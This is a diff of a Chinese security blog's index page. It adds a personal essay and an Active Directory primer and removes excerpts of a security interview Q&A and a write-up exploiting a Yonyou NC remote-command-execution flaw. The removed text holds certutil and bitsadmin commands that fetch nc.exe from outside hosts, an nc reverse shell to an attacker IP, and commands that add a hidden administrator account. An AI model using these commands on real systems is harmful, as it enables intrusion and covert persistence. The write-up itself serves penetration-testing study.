@@ -227,6 +227,163 @@
             
 
   
+    <article id="post-大概是孤独" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/">大概是孤独</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/" class="archive-article-date">
+        <time datetime="2021-10-07T11:37:00.876Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-07</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>写了很多，删了很多，或许人都有矫情的时候吧，又或许还没有坚强到轻易让别人看穿自己软弱的地步。</p>
+<p>anyway</p>
+<p>生活本就是自扫庭前雪，自己去污秽。</p>
+<p>说到底还是闲的</p>
+<p>记得专攻术业，好好生活，先自爱，再爱人。愿你我共勉。</p>
+<p><img src="https://i.loli.net/2021/10/07/ZqEaWUsCwrlnIxi.jpg" alt="微信图片_20211007193606"></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-内网基础：" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h2><p>1、<strong>工作组：</strong>工作组内所有计算机是对等的。工作组不能集中管理。</p>
+<p>2、<strong>域：</strong>域可以说是工作组的升级，域内的安全管理控制机制更加严格，用户需要访问域需要有合法的身份登录才行，之后才能访问域内资源。用户在域内的身份不同，能访问的资源也不同。</p>
+<p>3、<strong>域控：</strong>域控是域内一台类似管理域内机器的计算机，通俗来说像一个单位的门禁系统。当有用户访问域内资源时，域控会鉴别计算机是否属于这个域。域控是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行，域内所有用来验证身份的账号和密码散列值都保存在域控制器中。</p>
+<p>4、**<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/282319.html">域环境：</a>**单域、父域、子域、域树、域森林。</p>
+<p>5、<strong>域名服务器：</strong>域名服务器就是DNS，在现实用IP配置也是经常会配置的。实际上域中的计算机是使用DNS来定位域控制器、服务器、网络服务等。所以域的名字就是DNS域的名字。所以在内网渗透中，大多数情况下是通过寻找DNS服务器来定位域控制器的。因为域控制器和DNS服务都配置在同一台机器上！</p>
+<p>6、<strong>活动目录：</strong>AD是域环境中提供目录服务的组件。</p>
+<p>7、<strong>域控制器和活动目录的区别：</strong>把域内的众多资源（计算机、用户、用户组、打印机、共享文件等）分门别类有序的放在一个大的仓库中，并将检索信息整理好以便查找和访问这些资源的一个数据库就是活动目录数据库简称AD库。要实现域环境其实就是要安装AD。如果内网中的一台机器上安装了AD，那么它就成为了域控DC。域控就是安装了活动目录的计算机。</p>
+<p>8、<strong>安全域的划分：</strong>在一个路由器连接的网络中，可以将网络划分为内网、DMZ、以及外网三个区域。这三个区域需要完成不同的任务，因此需要设置不同的访问策略。（ACL）</p>
+<p>9、<strong>域中计算机的分类：</strong></p>
+<ul>
+<li>域控</li>
+<li>成员服务器</li>
+<li>客户机</li>
+<li>独立服务器：独立服务器不在域中，也没有安装活动目录。</li>
+</ul>
+<p>10、<strong>域内权限解读：</strong>A-G-DL-P策略（A:用户账户 G：表示全局组 U：表示通用组 DL：表示域本地组 P：表示资源权限）</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/10/01/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%EF%BC%9A/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-安全服务项目防坑指南" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1113,269 +1270,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2021/06/10/%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-安洵面试题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="web安全面试题"><a href="#web安全面试题" class="headerlink" title="web安全面试题"></a>web安全面试题</h2><p><strong>1）给你一个目标站，你觉得应该先做什么？</strong></p>
-<p>信息收集（域名子域、真实ip、端口服务探测）</p>
-<p>漏洞发现（漏洞扫描、CMS识别、应用版本识别、poc验证漏洞存在、黑盒测试、源码审计）</p>
-<p>漏洞利用（历史漏洞、EXP利用、能否反弹shell、爆库）</p>
-<p>持续控制（提升权限、维持访问、清除痕迹）</p>
-<p><strong>2）写出下列端口对应的服务？</strong></p>
-<table>
-<thead>
-<tr>
-<th>21</th>
-<th>22</th>
-<th>80</th>
-<th>443</th>
-<th>1433</th>
-<th>3306</th>
-<th>3389</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>telnet</td>
-<td>ssh</td>
-<td>http</td>
-<td>https</td>
-<td>sqlserver</td>
-<td>mysql</td>
-<td><strong>mstsc</strong></td>
-</tr>
-</tbody></table>
-<p><strong>3）常见的上传解析漏洞</strong></p>
-<p><strong>apache：</strong>从右向左（abc.php.xxx.aaa.bbb） -&gt; abc.php</p>
-<p><strong>iis6.0:</strong> </p>
-<p>文件夹名泛解析（aaa.asp文件夹下的a.txt会以asp解析）</p>
-<p>特殊文件名(;.jpg): aaa.asp;.jpg这个文件会以asp方式运行。</p>
-<p><strong>iis7.0、7.5:</strong></p>
-<p>任意文件名.jpg，在后面追加上/任意文件名.php，那么这个文件会以PHP方式来运行 比如<a target="_blank" rel="noopener" href="http://xxxxv/tila.jpg/ccc.php">http://xxxxv/tila.jpg/ccc.php</a> 会以tila.php解析。</p>
-<p><strong>Nginx 解析漏洞：</strong></p>
-<p>任意文件名后面添加xxx.php的方式来运行这个文件</p>
-<p>在文件后面添加%00.php也会以php的方式运行。</p>
-<p><strong>3）域内常用命令</strong></p>
-<p><strong>ipconfig /all</strong>判断是否存在域，<strong>nslookup</strong>判断域控是否与dns服务器在同一服务器上，<strong>net config workstation</strong>查看登录域信息，<strong>net time /domain</strong>查看主域,若是报错或者显示时间，有域控。否则不存在域。</p>
-<p><strong>4）域管账号密码对其他成员执行命令</strong></p>
-<p><strong>5）cmd下远程文件下载</strong></p>
-<p>vb下载：先echo写入vb脚本，然后cscript执行下载脚本</p>
-<p>certutil一句话下载payload：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt</span><br></pre></td></tr></table></figure>
-
-<p>ftp一句话下载payload：先echo写入ftp下载脚本，然后执行ftp -s:xxx</p>
-<p>bitsadmin 下载一句话/payload：bitsadmin /transfer down /download /priority normal ‘<a target="_blank" rel="noopener" href="http://198.13.37.239/nc.exe&#39;">http://198.13.37.239/nc.exe&#39;</a> d:\nc.exe</p>
-<p>js一句话读取/写入文件</p>
-<p>powershell一句话下载payload：powershell.exe -ExecutionPolicy Bypass -File down.ps1</p>
-<p><strong>6）抓包改包</strong></p>
-<p>burp、fiddle、charles</p>
-<p><strong>7）常见的web容器</strong></p>
-<p>IIS,APACHE,NGINX,TOMCAT,WEBLOGIC,DJANGO,JBOSS</p>
-<p><strong>8) 快速判断目标服务器是Windows还是linux</strong></p>
-<p>是否大小写敏感</p>
-<p><strong>9）常见的Windows提权方法</strong></p>
-<p>1）syteminfo查看补丁信息，查找exp（内核提权）</p>
-<p>2）mssql提取、udf提权</p>
-<p>3）Windows系统配置错误提权(dll劫持、<strong>注册表键AlwaysInstallElevated</strong>、<strong>可信任服务路径漏洞</strong>、自动安装配置文件*、计划任务)</p>
-<ol start="4">
-<li>bypass uac</li>
-</ol>
-<p><strong>10）下列端口对应的服务</strong></p>
-<table>
-<thead>
-<tr>
-<th>873</th>
-<th>5000</th>
-<th>5900</th>
-<th>1521</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>rsync文件同步</td>
-<td></td>
-<td>vnc远程</td>
-<td>oracle</td>
-</tr>
-</tbody></table>
-<p><strong>11) .htaccess 文件配置jsp文件解析为php</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
-
-<p><strong>12) csrf ,ssrf .以及重放攻击的区别</strong></p>
-<p>重放攻击：以登录业务为例（不具备身份，但是有认证信息）</p>
-<p>csrf：以添加用户为例（已经有了一个身份、用户或者是管理员）</p>
-<p>ssrf： 伪造服务端发送请求，探测内网</p>
-<p><strong>13）windows下添加本地账户以及加入到管理员组的命令</strong></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user whoami$ Liu78963 /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators whoami$ /add</span><br></pre></td></tr></table></figure>
-
-<p><strong>14) windows下&gt;与&gt;&gt;的区别：</strong>写入（会覆盖）与追加</p>
-<p><strong>15）常见的javaweb应用以及框架</strong></p>
-<p><strong>Hibernate、Struts2、MyBatis、Spring、spring MVC</strong> </p>
-<p><strong>16）mysql 导出文件的命令</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump 数据库名 <span class="comment">--host=主机 --port=端口 -u用户名 -p密码 --where=&quot;过滤条件&quot; --tables 数据表 &gt; 导出文件路径.sql</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>17）缓冲区溢出</strong></p>
-<p><strong>18）DNS域传送</strong>漏洞复现命令</p>
-<p><strong>19）nmap 默认扫描哪些端口</strong></p>
-<p>默认情况下，Nmap用指定的协议对端口1到1024以及<code>nmap-services</code> 文件中列出的更高的端口在扫描。</p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/06/09/%E5%AE%89%E6%B4%B5%E9%9D%A2%E8%AF%95%E9%A2%98/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-CNVD-2021-30193 " class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/06/09/CNVD-2021-30193%20/">从命令执行到getshell</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/06/09/CNVD-2021-30193%20/" class="archive-article-date">
-        <time datetime="2021-06-09T07:22:19.665Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="CNVD-2021-30193-从命令执行到getshell"><a href="#CNVD-2021-30193-从命令执行到getshell" class="headerlink" title="CNVD-2021-30193 从命令执行到getshell"></a>CNVD-2021-30193 从命令执行到getshell</h2><h3 id="漏洞简介：用友-NC-bsh-servlet-BshServlet-远程命令执行漏洞"><a href="#漏洞简介：用友-NC-bsh-servlet-BshServlet-远程命令执行漏洞" class="headerlink" title="漏洞简介：用友 NC bsh.servlet.BshServlet 远程命令执行漏洞"></a>漏洞简介：<strong>用友 NC bsh.servlet.BshServlet 远程命令执行漏洞</strong></h3><p>用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限</p>
-<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609160221270.png" alt="image-20210609160221270"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先考虑反弹一个稳定的shell。目标主机是Win2012这里选择使用nc,但是目标主机上没有，所以需要先下载下来。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://198.xx.xx.xx/nc.exe d:\\xxh.exe</span><br></pre></td></tr></table></figure>
-
-<p>服务端开启监听之后再执行：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d:\\xxh.exe 198.xx.xx.xxx 1988 -e c:\\windows\\system32\\cmd.exe</span><br></pre></td></tr></table></figure>
-
-<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>可以看到，目标机已经建立起连接。</p>
-<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609162551767.png" alt="image-20210609162551767"></p>
-<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609164234717.png" alt="image-20210609164234717"></p>
-<h4 id="持续控制"><a href="#持续控制" class="headerlink" title="持续控制"></a>持续控制</h4><p>现在已经得到一个稳定的shell，并且是管理员权限。因此接下来就只需要持久控制进行权限的维持。这里选择使用<strong>Windows系统隐藏账户</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user kriller$ kriller /add</span><br><span class="line">net localgroup administrators kriller$ /add</span><br></pre></td></tr></table></figure>
-
-<p>接着修改注册表，删除用户，再导入用户信息到注册表。这样该隐藏账户的隐蔽性更高。具体步骤请参考：<a target="_blank" rel="noopener" href="https://whoamianony.top/2020/10/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/">链接</a></p>
-    
-    <a class="article-more-a" href="/2021/06/09/CNVD-2021-30193%20/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/06/09/CNVD-2021-30193%20/">展开全文 >></a>
     </p>
     
 
